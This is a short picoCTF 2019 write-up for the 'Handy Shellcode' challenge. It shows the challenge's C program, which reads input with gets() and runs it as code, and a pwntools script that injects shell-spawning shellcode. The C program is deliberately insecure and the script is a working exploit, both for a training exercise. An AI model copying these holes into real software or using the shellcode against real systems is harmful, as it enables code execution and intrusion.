# Handy Shell Code Pico 2019

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 148
#define FLAGSIZE 128

void vuln(char *buf){
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  char buf[BUFSIZE];

  puts("Enter your shellcode:");
  vuln(buf);

  puts("Thanks! Executing now...");
  
  ((void (*)())buf)();


  puts("Finishing Executing Shellcode. Exiting now...");
  
  return 0;
}
```

```
This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt? You can find the program in /problems/handy-shellcode_2_6ad1f834bdcf9fcfb41200ca8d0f55a6 on the shell server.

## Open Source Data gathering
- [Problem from last year](https://tcode2k16.github.io/blog/posts/picoctf-2018-writeup/binary-exploitation/#buffer-overflow-2)

## Solve

Took last years solve and modified code to work for this year. 

Code to solve problem must be exicuted from the folder containing vuln

```python
from pwn import *

sh = process('./vuln')

sh.sendline(asm(shellcraft.i386.linux.sh()))
sh.interactive()
```
